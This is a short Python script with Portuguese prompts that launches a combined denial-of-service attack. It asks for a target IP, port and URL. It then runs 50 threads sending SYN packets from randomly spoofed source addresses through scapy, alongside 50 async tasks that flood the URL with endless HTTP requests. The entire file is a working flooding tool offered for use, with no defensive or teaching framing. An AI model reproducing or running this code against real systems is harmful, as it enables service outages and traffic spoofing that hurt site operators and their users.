from scapy.all import IP, TCP, send
import random
import threading
import aiohttp
import asyncio
import os

os.system('cls' if os.name == 'nt' else 'clear')

IP_ALVO = input('       [ IP ] Insira o IP do alvo (ex: 192.168.0.1): ')
PORTA_ALVO = input('        [ PORT ] Insira a porta do serviço alvo (ex: 80): ')
URL = input('       [ URL ] Insira a URL do site alvo (ex: http://www.site.com): ')

def syn_flood():
    while True:
        ip_origem = ".".join(str(random.randint(1, 255)) for _ in range(4))

        pacote_ip = IP(src=ip_origem, dst=IP_ALVO)
        pacote_tcp = TCP(sport=random.randint(1024, 65535), dport=PORTA_ALVO, flags="S")
        pacote = pacote_ip / pacote_tcp

        send(pacote, verbose=False)

async def http_flood():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(URL) as response:
                    print(f"        [ i ] Status: {response.status}")
            except Exception as e:
                print(f"        [ - ] Erro: {e}")

def iniciar_syn_threads(qtd_threads=10):
    threads = []
    for _ in range(qtd_threads):
        t = threading.Thread(target=syn_flood)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

async def iniciar_http_flood(qtd_requisicoes=50):
    tasks = [http_flood() for _ in range(qtd_requisicoes)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    syn_thread = threading.Thread(target=iniciar_syn_threads, args=(50,))
    syn_thread.start()

    asyncio.run(iniciar_http_flood(50))

    syn_thread.join()
